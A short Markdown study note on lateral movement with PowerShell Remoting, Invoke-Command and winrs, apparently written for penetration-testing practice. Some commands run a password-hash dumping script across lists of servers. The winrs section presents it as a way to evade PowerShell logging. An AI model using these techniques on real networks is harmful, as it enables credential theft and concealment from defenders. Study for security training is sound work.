---
tags:
  - lateral-movement
cssclasses:
---
#### Connect to remote hosts using [[PowerShell]]

- More silent and faster than psexec
- [PSRemoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.4&viewFallbackFrom=powershell-7.3) uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management
- Enabled by default on Server 2012 onwards with a firewall exception
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS)
- It is the recommended way to manage Windows Core servers.
- Enabling remoting (`Enable-PSRemoting`) on a Desktop Windows machine might be required, admin privileges are required to do that.
- The remoting process runs as a high integrity process. That is, you get an elevated shell.

#### PSSession
- Interactive
- Runs in a new process (wsmprovhost)
- Is stateful
- One-to-One

```powershell title:"Useful cmdlets"
New-PSSession
Enter-PSSession
```

```powershell title:"Usage"
$computername = New-PSSession -ComputerName computername
```

#### Invoke-Command
- Non-Interactive
- Executes commands parallelly
- Stateless, also known as fan-out remoting
- One-to-Many

```powershell title:"Execute commands or scriptblocks"
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

```powershell title:"Execute scripts from files"
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell title:"Execute locally loaded function on the remote machines"
Invoke-Command -ScriptBlock ${function:Get-Passhashes} -ComputerName (Get-Content <list_of_servers>)
```

```powershell title:"Execute locally loaded function on the remote machines and passing arguments to it"
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

```powershell title:"Execute "stateful" commands using Invoke-Commmand"
Invoke-Command -Session $computername -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $computername -ScriptBlock {$Proc.Name}
```

#### winrs
- PowerShell remoting supports the system-wide transcripts and deep script block logging
- We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts)

```batch title:"Usage"
winrs -r:computername -u:computername\administrator -p:password hostname
```
```batch
winrs -r:computername command
```
